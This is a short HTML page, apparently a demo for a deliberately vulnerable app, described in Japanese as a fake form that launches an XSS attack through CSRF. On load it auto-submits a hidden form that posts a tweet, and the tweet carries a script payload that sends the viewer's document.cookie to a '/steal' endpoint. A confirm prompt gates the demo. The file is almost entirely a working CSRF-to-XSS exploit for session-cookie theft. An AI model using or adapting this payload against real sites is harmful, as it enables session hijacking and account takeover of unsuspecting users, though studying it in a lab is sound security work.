<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="utf-8">
</head>
<body>
<p>csrf攻撃からのxss攻撃をするための偽フォーム</p>

<form name="trapform">
    <!-- 罠ページへのリダイレクトをするスクリプトを含むツイートテキスト -->
    <!-- 無限送信ループ防止用の確認機能付き-->
    <input type="hidden" name="text" value='`<script>if(window.confirm("OKを押すと攻撃します。")) {window.location="<?=url('/steal')?>?sid="+document.cookie;}</script>`'>
</form>

<script>
    document.trapform.action = "<?=url('/tweet/danger/post')?>";
    document.trapform.method = "post";
    document.trapform.submit();
</script>
</body>
</html>
